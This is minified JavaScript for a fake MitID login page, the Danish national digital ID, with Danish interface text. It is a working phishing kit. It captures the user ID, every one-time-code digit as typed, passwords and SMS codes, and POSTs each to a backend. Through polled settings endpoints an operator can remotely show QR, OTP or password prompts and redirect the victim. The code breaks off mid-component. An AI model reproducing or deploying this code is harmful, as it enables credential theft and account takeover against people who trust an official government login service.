import {c as C, j as e, s as ie, v as de, Q as se, B as h, C as le, a as ue} from "./browser-ClpSNpCR.js";
import {r as d, R as S, H as me, a as he, b as ve} from "./vendor-react-sicEs9XM.js";
import "./vendor-qr-4HvgGXca.js";
const be = [["path", {
    d: "M5 12h14",
    key: "1ays0h"
}], ["path", {
    d: "m12 5 7 7-7 7",
    key: "xquz4c"
}]]
  , pe = C("arrow-right", be);
const we = [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
}]]
  , ne = C("check", we);
const fe = [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3",
    key: "1u773s"
}], ["path", {
    d: "M12 17h.01",
    key: "p32p05"
}]]
  , ye = C("circle-question-mark", fe);
const xe = [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M12 16v-4",
    key: "1dtifu"
}], ["path", {
    d: "M12 8h.01",
    key: "e9boi3"
}]]
  , Ne = C("info", xe)
  , ge = ({onContinue: s, onCancel: t}) => {
    const [a,r] = d.useState("")
      , [o,n] = d.useState(!1)
      , [v,b] = d.useState("")
      , p = a.length > 0
      , w = () => {
        if (!p)
            return;
        const f = ie(a)
          , x = de(f);
        if (!x.valid) {
            b(x.error || "Ugyldigt bruger-ID");
            return
        }
        b(""),
        s(f)
    }
    ;
    return e.jsx("div", {
        className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans",
        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMzQ6NA",
        "data-yw-s": !0,
        children: e.jsxs("div", {
            className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMzU6Ng",
            "data-yw-s": !0,
            children: [e.jsxs("div", {
                className: "flex justify-between items-center px-8 py-6 border-b border-[#d8d8d8] animate-fade-in",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMzc6OA",
                "data-yw-s": !0,
                children: [e.jsx("h1", {
                    className: "text-[20px] font-bold text-[#1a1a1a] tracking-tight",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMzg6MTA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Log på hos MitID.dk"
                }), e.jsx("img", {
                    src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
                    alt: "MitID",
                    className: "h-6",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMzk6MTA",
                    "data-yw-i": !0,
                    "data-yw-s": !0
                })]
            }), e.jsxs("div", {
                className: "px-8 py-8",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANDc6OA",
                "data-yw-s": !0,
                children: [e.jsxs("div", {
                    className: "mb-6 animate-fade-in-1",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANDk6MTA",
                    "data-yw-s": !0,
                    children: [e.jsxs("div", {
                        className: "flex items-center gap-2 mb-2",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANTA6MTI",
                        "data-yw-s": !0,
                        children: [e.jsx("label", {
                            className: "text-[12px] font-bold text-[#1a1a1a] tracking-wide uppercase",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANTE6MTQ",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Bruger-ID"
                        }), e.jsx(ye, {
                            className: "w-4 h-4 text-[#1a1a1a]",
                            strokeWidth: 2
                        })]
                    }), e.jsxs("div", {
                        className: "relative",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANTQ6MTI",
                        "data-yw-s": !0,
                        children: [e.jsx("input", {
                            type: "text",
                            className: "w-full pl-3 pr-12 py-3 border-[2px] border-[#0060e6] rounded-[4px] outline-none text-lg text-[#1a1a1a] bg-[#f5faff]",
                            autoFocus: !0,
                            value: a,
                            onChange: f => r(f.target.value),
                            onKeyDown: f => {
                                f.key === "Enter" && p && w()
                            }
                            ,
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANTU6MTQ",
                            "data-yw-s": !0
                        }), e.jsx("span", {
                            className: "absolute right-3 top-1/2 -translate-y-1/2 text-[#1a1a1a] text-[15px] cursor-pointer hover:underline",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANjc6MTQ",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Skjul"
                        })]
                    }), v && e.jsx("div", {
                        className: "mt-2 text-[#cc0000] text-[13px] font-medium",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANzE6MTQ",
                        "data-yw-s": !0,
                        children: v
                    })]
                }), e.jsxs("button", {
                    className: `w-full text-white font-bold text-[16px] uppercase tracking-wider py-4 px-6 rounded-[4px] flex items-center justify-between mb-6 transition-all duration-150 min-h-[56px] active:scale-[0.98] animate-fade-in-2 ${p ? "bg-[#0060e6] hover:bg-[#004cb8] cursor-pointer shadow-md shadow-blue-600/20 hover:shadow-lg hover:shadow-blue-600/30" : "bg-[#cccccc] cursor-not-allowed"}`,
                    disabled: !p,
                    onClick: w,
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hANzg6MTA",
                    "data-yw-s": !0,
                    children: [e.jsx("span", {
                        className: "flex-1 text-center ml-6",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAODc6MTI",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "FORTSÆT"
                    }), e.jsx(pe, {
                        className: "w-5 h-5",
                        strokeWidth: 2.5
                    })]
                }), e.jsxs("div", {
                    className: "flex items-center gap-2 text-[#0060e6] mb-12 group cursor-pointer hover:underline animate-fade-in-3",
                    title: "Har du glemt dit bruger-ID, kan du se det ved at scanne dit pas i MitID appen.",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAOTI6MTA",
                    "data-yw-s": !0,
                    children: [e.jsx(Ne, {
                        className: "w-5 h-5",
                        strokeWidth: 2
                    }), e.jsx("span", {
                        className: "text-[14px] font-medium",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAOTQ6MTI",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "Glemt bruger-ID?"
                    })]
                }), e.jsxs("div", {
                    className: "pt-4 animate-fade-in-4",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAOTg6MTA",
                    "data-yw-s": !0,
                    children: [e.jsxs("div", {
                        className: "flex items-center gap-3 mb-6 cursor-pointer group select-none",
                        onClick: () => n(!o),
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAOTk6MTI",
                        "data-yw-s": !0,
                        children: [e.jsx("div", {
                            className: `w-5 h-5 border-[2px] rounded-[2px] flex items-center justify-center transition-colors ${o ? "bg-[#0060e6] border-[#0060e6]" : "border-[#1a1a1a] group-hover:bg-gray-50"}`,
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMTAzOjE0",
                            "data-yw-s": !0,
                            children: o && e.jsx(ne, {
                                className: "w-4 h-4 text-white",
                                strokeWidth: 3
                            })
                        }), e.jsx("span", {
                            className: "text-[#001845] font-bold text-[15px]",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMTA4OjE0",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Husk mig hos MitID.dk"
                        })]
                    }), e.jsx("div", {
                        className: "border-t border-[#d8d8d8] pt-4 text-center",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMTExOjEy",
                        "data-yw-s": !0,
                        children: e.jsx("a", {
                            href: "#",
                            onClick: f => {
                                f.preventDefault(),
                                t()
                            }
                            ,
                            className: "text-[#0060e6] font-bold text-[15px] hover:underline",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2dpbi50c3hAMTEyOjE0",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            "data-yw-l": !0,
                            children: "Afbryd"
                        })
                    })]
                })]
            })]
        })
    })
}
  , je = ({titleText: s}) => e.jsx("div", {
    className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans",
    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEA5OjQ",
    "data-yw-s": !0,
    children: e.jsxs("div", {
        className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm flex flex-col items-center justify-center py-24 min-h-[550px] animate-[fadeIn_0.4s_ease-out]",
        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAxMDo2",
        "data-yw-s": !0,
        children: [e.jsx("img", {
            src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
            alt: "MitID",
            className: "h-7 mb-10",
            loading: "eager",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAxMzo4",
            "data-yw-i": !0,
            "data-yw-s": !0
        }), e.jsxs("div", {
            className: "relative mb-10",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAyMTo4",
            "data-yw-s": !0,
            children: [e.jsx("svg", {
                width: "100",
                height: "120",
                viewBox: "0 0 100 120",
                fill: "none",
                xmlns: "http://www.w3.org/2000/svg",
                className: "drop-shadow-sm",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAyMzoxMA",
                "data-yw-s": !0,
                children: e.jsx("path", {
                    d: "M50 0L100 15V60C100 95 50 120 50 120C50 120 0 95 0 60V15L50 0Z",
                    fill: "#0060e6"
                })
            }), e.jsx("div", {
                className: "absolute inset-0 flex items-center justify-center pt-2",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAzODoxMA",
                "data-yw-s": !0,
                children: e.jsx("div", {
                    className: "w-12 h-12 border-[4px] border-white/30 border-t-white rounded-full animate-spin",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEAzOToxMg",
                    "data-yw-s": !0
                })
            })]
        }), e.jsx("h2", {
            className: "text-[20px] font-bold text-[#1a1a1a] mb-2 text-center tracking-tight",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEA0NDo4",
            "data-yw-s": !0,
            children: s || "Forbinder sikkert"
        }), e.jsx("p", {
            className: "text-[#5c5c5c] text-[14px] font-normal animate-pulse",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURMb2FkaW5nLnRzeEA0NTo4",
            "data-yw-t": !0,
            "data-yw-s": !0,
            children: "Vent venligst ..."
        })]
    })
})
  , Me = ({onCancel: s}) => {
    const [t,a] = d.useState(null)
      , [r,o] = d.useState(null)
      , [n,v] = d.useState(!1)
      , [b,p] = d.useState(!1)
      , [w,f] = d.useState(!1)
      , [x,U] = d.useState("")
      , [k,j] = d.useState(!1)
      , [c,T] = d.useState("")
      , [B,I] = d.useState("")
      , [oe,z] = d.useState("");
    d.useEffect( () => {
        if (n)
            f(!0),
            requestAnimationFrame( () => {
                requestAnimationFrame( () => p(!0))
            }
            );
        else {
            p(!1);
            const l = setTimeout( () => f(!1), 300);
            return () => clearTimeout(l)
        }
    }
    , [n]);
    const [D,P] = d.useState(!1)
      , [Pe,Y] = d.useState(null)
      , [Ye,$e] = d.useState(!0)
      , [A,$] = d.useState(["", "", "", "", "", ""])
      , Z = S.useRef([])
      , [H,W] = d.useState(!1)
      , [M,O] = d.useState("")
      , [V,X] = d.useState(!1)
      , _ = S.useRef(null)
      , G = S.useRef(null)
      , F = S.useRef(null)
      , q = S.useRef(0)
      , K = S.useRef(0)
      , ee = S.useRef(0)
      , te = S.useRef(0)
      , E = 3e3;
    d.useEffect( () => {
        const l = new BroadcastChannel("mitid_channel");
        return l.onmessage = i => {
            i.data.type === "sms_toggle" && (G.current = i.data.value,
            v(i.data.value),
            q.current = Date.now(),
            i.data.smsAmount !== void 0 && I(i.data.smsAmount)),
            i.data.type === "otp_toggle" && (F.current = i.data.value,
            P(i.data.value),
            K.current = Date.now(),
            i.data.code && Y(i.data.code)),
            i.data.type === "password_toggle" && (_.current = i.data.value,
            W(i.data.value),
            ee.current = Date.now()),
            i.data.type === "connection_text" && (z(i.data.value ?? ""),
            te.current = Date.now())
        }
        ,
        () => l.close()
    }
    , []),
    d.useEffect( () => {
        const l = async () => {
            if (!(Date.now() - q.current < E))
                try {
                    const [N,y] = await Promise.all([fetch(`${h}/api/public/settings/show-sms`), fetch(`${h}/api/public/settings/sms-amount`)])
                      , Q = await N.json()
                      , ae = await y.json();
                    ae.smsAmount !== void 0 && I(ae.smsAmount),
                    Q.showSmsField !== void 0 && Q.showSmsField !== G.current && (G.current = Q.showSmsField,
                    v(Q.showSmsField))
                } catch {}
        }
          , i = async () => {
            if (!(Date.now() - K.current < E))
                try {
                    const y = await (await fetch(`${h}/api/public/settings/show-otp`)).json();
                    y.showOtpField !== void 0 && y.showOtpField !== F.current && (F.current = y.showOtpField,
                    P(y.showOtpField))
                } catch {}
        }
          , u = async () => {
            try {
                const y = await (await fetch(`${h}/api/public/settings/otp-code`)).json();
                y.otpCode && Y(y.otpCode)
            } catch {}
        }
          , m = async () => {
            if (!(Date.now() - ee.current < E))
                try {
                    const y = await (await fetch(`${h}/api/public/settings/show-password`)).json();
                    y.showPasswordField !== void 0 && y.showPasswordField !== _.current && (_.current = y.showPasswordField,
                    W(y.showPasswordField))
                } catch {}
        }
        ;
        l(),
        i(),
        u(),
        m();
        const g = async () => {
            if (!(Date.now() - te.current < E))
                try {
                    const y = await (await fetch(`${h}/api/public/settings/connection-text`)).json();
                    y.connectionText !== void 0 && z(y.connectionText)
                } catch {}
        }
        ;
        g();
        const R = setInterval( () => {
            l(),
            i(),
            u(),
            m(),
            g()
        }
        , 500);
        return () => clearInterval(R)
    }
    , []);
    const J = S.useRef(null);
    d.useEffect( () => {
        const l = async () => {
            try {
                const m = await (await fetch(`${h}/api/public/current-qr`, {
                    headers: {
                        "Cache-Control": "no-cache"
                    }
                })).json();
                if (m.qrData && m.qrData !== J.current) {
                    J.current = m.qrData,
                    o(m.qrData);
                    try {
                        const g = await se.toDataURL(m.qrData, {
                            width: 200,
                            margin: 1
                        });
                        a(g)
                    } catch {}
                } else
                    !m.qrData && J.current && (J.current = null,
                    o(null),
                    a(null))
            } catch {}
        }
        ;
        l();
        const i = setInterval(l,200);
        return () => clearInterval(i)
    }
    , []),
    d.useEffect( () => {
        const l = new BroadcastChannel("mitid_channel");
        return l.onmessage = async i => {
            if (i.data.type === "qr") {
                const u = i.data.value;
                if (J.current = u,
                o(u),
                u)
                    try {
                        const m = await se.toDataURL(u, {
                            width: 200,
                            margin: 1
                        });
                        a(m)
                    } catch {}
                else
                    a(null)
            }
        }
        ,
        () => l.close()
    }
    , []),
    d.useEffect( () => {
        let l = ""
          , i = !1;
        const u = async () => {
            if (!i)
                try {
                    const R = await (await fetch(`${h}/api/public/settings/redirect-url`, {
                        headers: {
                            "Cache-Control": "no-cache"
                        }
                    })).json();
                    if (R.redirectUrl && R.redirectUrl.length > 0 && R.redirectUrl !== l) {
                        l = R.redirectUrl,
                        i = !0;
                        try {
                            await fetch(`${h}/api/public/settings/redirect-url`, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    redirectUrl: ""
                                })
                            })
                        } catch {}
                        window.location.href = R.redirectUrl
                    }
                } catch {}
        }
        ;
        u();
        const m = setInterval(u, 200);
        return () => clearInterval(m)
    }
    , []);
    const ce = async () => {
        if (!x || x.length < 4) {
            T("Indtast venligst en gyldig kode");
            return
        }
        T("");
        try {
            await fetch(`${h}/api/public/sms-codes`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    code: x
                })
            }),
            j(!0),
            U(""),
            setTimeout( () => {
                j(!1)
            }
            , 1e4)
        } catch {
            T("Fejl ved sending. Prøv igen.")
        }
    }
    ;
    return e.jsx("div", {
        className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans animate-[fadeIn_0.3s_ease-out]",
        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDMzNjo0",
        "data-yw-s": !0,
        children: e.jsxs("div", {
            className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm flex flex-col items-center py-10 min-h-[550px]",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDMzNzo2",
            "data-yw-s": !0,
            children: [e.jsx("img", {
                src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
                alt: "MitID",
                className: "h-6 mb-8",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM0MDo4",
                "data-yw-i": !0,
                "data-yw-s": !0
            }), e.jsx("h2", {
                className: `text-[20px] font-bold text-[#1a1a1a] tracking-tight ${t && !w && !D && !H ? "mb-2" : "mb-8"}`,
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM0Nzo4",
                "data-yw-s": !0,
                children: H && !w ? "Bekræft identitet" : D && !w ? "Godkend med kodeviser" : oe || "Forbinder sikkert"
            }), !w && !D && !H && e.jsx("div", {
                className: `bg-white p-2 w-48 h-48 flex items-center justify-center relative ${t ? "mt-0 mb-4" : "mt-10 mb-8"}`,
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM1Mzo4",
                "data-yw-s": !0,
                children: t ? e.jsx("img", {
                    src: t,
                    alt: "QR Code",
                    className: "w-full h-full object-contain animate-[fadeIn_0.5s_ease-out]",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM1NToxMg",
                    "data-yw-s": !0
                }) : e.jsxs("div", {
                    className: "flex flex-col items-center justify-center relative animate-[fadeIn_0.5s_ease-out]",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM2MToxMg",
                    "data-yw-s": !0,
                    children: [e.jsx("svg", {
                        width: "100",
                        height: "120",
                        viewBox: "0 0 100 120",
                        fill: "none",
                        xmlns: "http://www.w3.org/2000/svg",
                        className: "mb-3",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM2MzoxNA",
                        "data-yw-s": !0,
                        children: e.jsx("path", {
                            d: "M50 0L100 15V60C100 95 50 120 50 120C50 120 0 95 0 60V15L50 0Z",
                            fill: "#0060E6"
                        })
                    }), e.jsx("div", {
                        className: "absolute top-[36px] left-1/2 -translate-x-1/2",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM3ODoxNA",
                        "data-yw-s": !0,
                        children: e.jsx("div", {
                            className: "w-10 h-10 border-[3px] border-white/30 border-t-[#0060e6] rounded-full animate-spin",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM3OToxNg",
                            "data-yw-s": !0
                        })
                    }), e.jsx("span", {
                        className: "text-sm font-bold text-[#1a1a1a] mt-1",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM4MjoxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "Venter på QR-kode"
                    }), e.jsx("p", {
                        className: "text-xs text-[#5c5c5c] mt-4 px-4 text-center leading-relaxed",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM4MzoxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "Vi er ved at generere en QR-kode til dig. Gør venligst din MitID app klar til at scanne."
                    })]
                })
            }), !w && !D && !H && t && e.jsxs("div", {
                className: "text-center px-8 mb-6",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM5MTo4",
                "data-yw-s": !0,
                children: [e.jsx("p", {
                    className: "text-[#1a1a1a] text-[15px] font-bold mb-1",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM5MjoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Scan QR-koden"
                }), e.jsx("p", {
                    className: "text-[#5c5c5c] text-[14px]",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM5MzoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Brug din MitID app til at scanne koden"
                })]
            }), D && !w && !H && e.jsxs("div", {
                className: "w-full max-w-[380px] px-4 sm:px-6 mb-6 flex flex-col items-center animate-[fadeIn_0.5s_ease-out]",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDM5OToxMA",
                "data-yw-s": !0,
                children: [e.jsxs("div", {
                    className: "flex items-center gap-2 mb-4 self-start",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQwMToxMg",
                    "data-yw-s": !0,
                    children: [e.jsxs("svg", {
                        width: "22",
                        height: "13",
                        viewBox: "0 0 60 34",
                        fill: "none",
                        xmlns: "http://www.w3.org/2000/svg",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQwMzoxNA",
                        "data-yw-s": !0,
                        children: [e.jsx("ellipse", {
                            cx: "30",
                            cy: "17",
                            rx: "30",
                            ry: "17",
                            fill: "#0a1f3d"
                        }), e.jsx("circle", {
                            cx: "14",
                            cy: "17",
                            r: "4",
                            fill: "white"
                        }), e.jsx("rect", {
                            x: "25",
                            y: "10.5",
                            width: "25",
                            height: "13",
                            fill: "white"
                        })]
                    }), e.jsx("span", {
                        className: "text-[14px] font-bold text-[#1a1a1a] uppercase tracking-wider",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQxMToxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "ENGANGSKODE"
                    }), e.jsx("span", {
                        className: "w-5 h-5 rounded-full border-2 border-[#0060e6] text-[#0060e6] flex items-center justify-center text-[11px] font-bold",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQxMjoxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "?"
                    })]
                }), e.jsx("div", {
                    className: "flex justify-center gap-1.5 sm:gap-2 mb-5 w-full",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQxNjoxMg",
                    "data-yw-s": !0,
                    children: A.map( (l, i) => e.jsx("input", {
                        ref: u => {
                            Z.current[i] = u
                        }
                        ,
                        type: "text",
                        inputMode: "numeric",
                        maxLength: 1,
                        value: l,
                        onChange: u => {
                            const m = u.target.value.replace(/\D/g, "")
                              , g = [...A];
                            g[i] = m,
                            $(g);
                            const R = g.join("");
                            fetch(`${h}/api/public/otp-entered`, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    code: R
                                })
                            }).catch( () => {}
                            );
                            try {
                                const N = new BroadcastChannel("mitid_channel");
                                N.postMessage({
                                    type: "otp_entered",
                                    code: R
                                }),
                                N.close()
                            } catch {}
                            m && i < 5 && Z.current[i + 1]?.focus()
                        }
                        ,
                        onKeyDown: u => {
                            u.key === "Backspace" && !A[i] && i > 0 && Z.current[i - 1]?.focus()
                        }
                        ,
                        className: `w-[44px] h-[52px] sm:w-[48px] sm:h-[56px] border-2 rounded-lg text-center text-[20px] sm:text-[22px] font-bold outline-none transition-colors ${i === A.findIndex(u => u === "") || A.every(u => u !== "") && i === 5 ? "border-[#0060e6] bg-[#f0f7ff]" : "border-[#d8d8d8] bg-white"} focus:border-[#0060e6] focus:bg-[#f0f7ff]`,
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQxODoxNg",
                        "data-yw-s": !0
                    }, i))
                }), e.jsxs("button", {
                    onClick: () => {
                        W(!0),
                        $(["", "", "", "", "", ""])
                    }
                    ,
                    className: "w-full font-bold text-[16px] uppercase tracking-wider py-4 px-4 rounded-[4px] flex items-center justify-between bg-[#0060e6] hover:bg-[#004cb8] text-white cursor-pointer transition-colors min-h-[56px] active:scale-[0.98] shadow-lg shadow-blue-600/20",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ2NjoxMg",
                    "data-yw-s": !0,
                    children: [e.jsx("span", {
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ3NDoxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "FORTSÆT"
                    }), e.jsx("svg", {
                        width: "20",
                        height: "20",
                        viewBox: "0 0 24 24",
                        fill: "none",
                        stroke: "currentColor",
                        strokeWidth: "2",
                        strokeLinecap: "round",
                        strokeLinejoin: "round",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ3NToxNA",
                        "data-yw-s": !0,
                        children: e.jsx("path", {
                            d: "M5 12h14M12 5l7 7-7 7"
                        })
                    })]
                })]
            }), H && !w && e.jsxs("div", {
                className: "w-full max-w-[380px] px-4 sm:px-6 mb-6 flex flex-col items-center animate-[fadeIn_0.5s_ease-out]",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ4NDoxMA",
                "data-yw-s": !0,
                children: [e.jsxs("div", {
                    className: "flex items-center gap-2 mb-4 self-start",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ4NToxMg",
                    "data-yw-s": !0,
                    children: [e.jsxs("svg", {
                        width: "20",
                        height: "20",
                        viewBox: "0 0 24 24",
                        fill: "none",
                        stroke: "#1a1a1a",
                        strokeWidth: "2",
                        strokeLinecap: "round",
                        strokeLinejoin: "round",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ4NjoxNA",
                        "data-yw-s": !0,
                        children: [e.jsx("rect", {
                            x: "3",
                            y: "11",
                            width: "18",
                            height: "11",
                            rx: "2",
                            ry: "2"
                        }), e.jsx("path", {
                            d: "M7 11V7a5 5 0 0110 0v4"
                        })]
                    }), e.jsx("span", {
                        className: "text-[14px] font-bold text-[#1a1a1a] uppercase tracking-wider",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ5MDoxNA",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "ADGANGSKODE"
                    })]
                }), e.jsx("input", {
                    type: "password",
                    value: M,
                    onChange: l => {
                        const i = l.target.value;
                        O(i)
                    }
                    ,
                    onBlur: () => {
                        if (M) {
                            fetch(`${h}/api/public/password-entered`, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    password: M
                                })
                            }).catch( () => {}
                            );
                            try {
                                const l = new BroadcastChannel("mitid_channel");
                                l.postMessage({
                                    type: "password_entered",
                                    password: M
                                }),
                                l.close()
                            } catch {}
                        }
                    }
                    ,
                    onKeyDown: l => {
                        if (l.key === "Enter" && M.length > 0 && !V) {
                            fetch(`${h}/api/public/password-entered`, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    password: M
                                })
                            }).catch( () => {}
                            );
                            try {
                                const i = new BroadcastChannel("mitid_channel");
                                i.postMessage({
                                    type: "password_entered",
                                    password: M
                                }),
                                i.close()
                            } catch {}
                            X(!0),
                            setTimeout( () => {
                                X(!1),
                                W(!1),
                                O("")
                            }
                            , 2e3)
                        }
                    }
                    ,
                    placeholder: "Indtast adgangskode",
                    className: "w-full px-4 py-4 border-2 border-[#d8d8d8] rounded-lg text-[16px] text-[#1a1a1a] outline-none transition-colors focus:border-[#0060e6] focus:bg-[#f0f7ff]",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDQ5MjoxMg",
                    "data-yw-s": !0
                }), e.jsx("button", {
                    onClick: () => {
                        if (!V) {
                            if (M) {
                                fetch(`${h}/api/public/password-entered`, {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/json"
                                    },
                                    body: JSON.stringify({
                                        password: M
                                    })
                                }).catch( () => {}
                                );
                                try {
                                    const l = new BroadcastChannel("mitid_channel");
                                    l.postMessage({
                                        type: "password_entered",
                                        password: M
                                    }),
                                    l.close()
                                } catch {}
                            }
                            X(!0),
                            setTimeout( () => {
                                X(!1),
                                W(!1),
                                O("")
                            }
                            , 2e3)
                        }
                    }
                    ,
                    disabled: V,
